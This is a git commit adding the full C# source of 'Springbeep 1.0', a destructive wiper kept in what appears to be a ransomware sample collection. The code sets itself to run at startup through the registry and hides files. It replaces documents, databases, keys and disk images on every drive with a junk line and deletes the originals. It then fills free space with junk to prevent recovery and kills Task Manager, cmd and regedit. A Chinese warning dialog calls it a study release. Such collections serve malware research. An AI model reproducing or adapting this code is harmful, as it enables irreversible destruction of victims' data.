764dab54e809f7967757f3186816d88bd28bf809
Voraka <voraka@163.com>
2018-01-17 10:33:27 +0800

    add Springbeep

---
+++ Ransom/Springbeep/Springbeep/form1.cs
@@ -0,0 +1,104 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Springbeep
+{
+    public partial class Form1 : Form
+    {
+        string[] Killproes = { "cmd.exe", "taskkill.exe", "ntsd.exe", "regedit.exe", "mmc.exe", "taskmgr.exe" };
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        [DllImport("shell32.dll")]
+        public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            if (Directory.Exists(Path.GetTempPath() + @"\HighSpeedCopy"))
+            {
+                try
+                {
+                    File.Move(Path.GetTempPath() + @"\HighSpeedCopy\winload.bin", Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\winload.bin");
+                    Directory.Delete(Path.GetTempPath() + @"\HighSpeedCopy", true);
+                }
+                catch
+                {
+                    ;
+                }
+            }
+            Thread mainwork = new Thread(Mainwork);
+            mainwork.Start();
+        }
+
+        private void Mainwork()
+        {
+            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\winload.hlp", Properties.Resources.winload);
+            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\sbeicon.ico", Properties.Resources.sbeicon);
+            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\sbpicon.ico", Properties.Resources.sbpicon);
+            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\blackwall.bmp", Properties.Resources.blackwall);
+            process1.Start();
+            process1.WaitForExit(5 * 1000);
+            RegistryKey Key = Registry.LocalMachine;
+            RegistryKey Run = Key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            Run.SetValue("SpringBeep", "\"" + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\cmdtool.exe\" /Autorun", RegistryValueKind.String);
+            Key.Close();
+            SystemParametersInfo(20, 1, Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\blackwall.bmp", 1);
+            SHChangeNotify(0x8000000, 0, IntPtr.Zero, IntPtr.Zero);
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (DriveInfo drive in drives)
+            {
+                if (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable)
+                {
+                    if (Directory.Exists(drive.Name))
+                    {
+                        int fileno = 1;
+                        while (drive.TotalFreeSpace > 512 * 1024 * 1024)
+                        {
+                            if (!File.Exists(drive.Name + @"Data" + fileno.ToString() + ".bin"))
+                                File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\winload.bin", drive.Name + @"Data" + fileno.ToString() + ".bin");
+                            fileno++;
+                        }
+                    }
+                }
+            }
+        }
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Process[] process = Process.GetProcesses();
+            foreach(Process thispro in process)
+            {
+                bool kill = false;
+                foreach (String thiskill in Killproes)
+                {
+                    if (thispro.ProcessName.ToUpper() == Path.GetFileNameWithoutExtension(thiskill).ToUpper())
+                        kill = true;
+                }
+                if (kill)
+                    thispro.Kill();
+            }
+        }
+    }
+}
---
+++ Ransom/Springbeep/Springbeep/program.cs
@@ -0,0 +1,169 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Springbeep
+{
+    static class Program
+    {
+        /// <summary>
+        /// 应用程序的主入口点。
+        /// </summary>
+        [STAThread]
+        static void Main(string[] args)
+        {
+            if (!Directory.Exists(Path.GetTempPath() + @"\HighSpeedCopy\"))
+                Directory.CreateDirectory(Path.GetTempPath() + @"\HighSpeedCopy\");
+            if (Path.GetFileName(Application.ExecutablePath) != "cmdtool.exe")
+            {
+                try
+                {
+                    if (File.Exists(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe"))
+                        File.Delete(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
+                    File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
+                }
+                catch
+                {
+                    ;
+                }
+                Process.Start(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
+                Environment.Exit(0);
+            }
+            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Springbeep.lock"))
+                WakeInst();
+            if (args.Length == 1)
+            {
+                if (args[0] == "/Autorun")
+                {
+                    Application.EnableVisualStyles();
+                    Application.SetCompatibleTextRenderingDefault(false);
+                    Application.Run(new Form1());
+                }
+                else if (Path.GetExtension(args[0]) == ".sbe")
+                    try
+                    {
+                        File.Move(args[0], Path.GetDirectoryName(args[0]) + @"\" + Path.GetFileNameWithoutExtension(args[0]) + @".sbp");
+                    }
+                    catch
+                    {
+                        Environment.Exit(0);
+                    }
+                else if (Path.GetExtension(args[0]) == ".sbp")
+                    try
+                    {
+                        File.Move(args[0], Path.GetDirectoryName(args[0]) + @"\" + Path.GetFileNameWithoutExtension(args[0]) + @".sbe");
+                    }
+                    catch
+                    {
+                        Environment.Exit(0);
+                    }
+                else
+                    Environment.Exit(0);
+            }
+            else
+            {
+                Environment.Exit(0);
+            }
+
+        }
+
+        static void WakeInst()
+        {
+            if (MessageBox.Show("你正在运行 Springbeep 1.0 病毒。\n它不是一个玩笑程序(Joke Program)，\n它会破坏你电脑上的所有数据，\n并使用垃圾填充硬盘防止恢复，\n因此请不要用它来破坏别人的电脑。\n我开源只是为了大家学习和交流，\n我不对因为误运行及被此病毒变种造成的后果负任何责任。\n请不要使用它做任何非善意的事情！\n目前病毒还未执行，\n点击是后病毒将立即开始执行，\n此时你的数据将会被破坏！\n如果你想反悔，你可以点击否来退出。", "Springbeep 1.0", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
+                Environment.Exit(0);
+            RegistryKey Key = Registry.CurrentUser;
+            RegistryKey Run = Key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
+            Run.SetValue("Hidden", 1, RegistryValueKind.DWord);
+            Key.Close();
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (DriveInfo drive in drives)
+            {
+                if (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable)
+                {
+                    if (Directory.Exists(drive.Name)) DoAllFiles(drive.Name);
+                }
+            }
+            string kbtext = "Springbeep 1.0", mbtext = "", longtext = "";
+            for (int i = 1; i <= 1024 / 15; i++)
+                kbtext += " Springbeep 1.0";
+            for (int i = 1; i <= 1024; i++)
+                mbtext += kbtext + " ";
+            for (int i = 1; i <= 64; i++)
+                longtext += mbtext + " ";
+            File.WriteAllText(Path.GetTempPath() + @"\HighSpeedCopy\winload.bin", longtext);
+            if (Application.ExecutablePath != Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe" && !File.Exists(Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe"))
+                File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"\HighSpeedCopy\cmdtool.exe");
+            File.WriteAllBytes(Path.GetTempPath() + @"\HighSpeedCopy\mode.vbs", Properties.Resources.mode);
+            Process.Start("wscript.exe", "\"" + Path.GetTempPath() + "\\HighSpeedCopy\\mode.vbs\"");
+            Environment.Exit(0);
+        }
+
+        static void DoAllFiles(string path)
+        {
+            string[] exnamelist = { "ppt", "pptx", "doc", "docx", "xlsx",
+                "sxi", "sxw", "odt", "hwp", "zip", "rar", "tar", "mp4", "mkv"
+                , "db", "7z", "cs", "res", "resx", "sln", "iso", "dmg", "isz"
+                , "ico", "png", "jpg", "jpeg", "mp3", "mp4", "pdf", "ogg", "wav", "wmv",
+                "eml", "msg", "ost", "pst", "deb", "sql", "accdb", "mdb", "dbf"
+                , "odb", "myd", "php", "java", "cpp", "asp", "asm", "key", "pfx"
+                , "pem", "p12", "csr", "gpg", "aes", "vsd", "odg", "raw", "nef"
+                , "svg", "psd", "vmx", "vmdk", "vdi"
+                };
+            DirectoryInfo dir = new DirectoryInfo(path);
+            try
+            {
+                DirectoryInfo[] info = dir.GetDirectories();
+                foreach (DirectoryInfo d in info)
+                {
+                    if (path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.Windows) && path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) && path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) && path + d.ToString() != Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86))
+                        DoAllFiles(dir + d.ToString() + @"\");
+                }
+                FileInfo[] file = dir.GetFiles();
+                foreach (FileInfo next in file)
+                {
+                    string fileName = next.ToString();
+                    if (fileName.LastIndexOf('.') != -1)
+                    {
+                        bool s = false;
+                        string exname = fileName.Substring(fileName.LastIndexOf('.') + 1);
+                        foreach (string exnametmp in exnamelist)
+                        {
+                            if (exname == exnametmp)
+                            {
+                                s = true;
+                                break;
+                            }
+                        }
+                        if (s)
+                            DoFile(dir + fileName);
+                    }
+                }
+            }
+            catch
+            {
+                ;
+            }
+        }
+        private static bool DoFile(string fileName)
+        {
+            try
+            {
+                File.SetAttributes(fileName, FileAttributes.Normal);
+                File.Move(fileName, Path.GetDirectoryName(fileName) + @"\" + Path.GetFileNameWithoutExtension(fileName) + @".tmp");
+                File.WriteAllText(Path.GetDirectoryName(fileName)+@"\"+Path.GetFileNameWithoutExtension(fileName) + @".sbe", @"This is a very bad world.");
+                File.Delete(Path.GetDirectoryName(fileName) + @"\"+Path.GetFileNameWithoutExtension(fileName) + @".tmp");
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+    }
+}
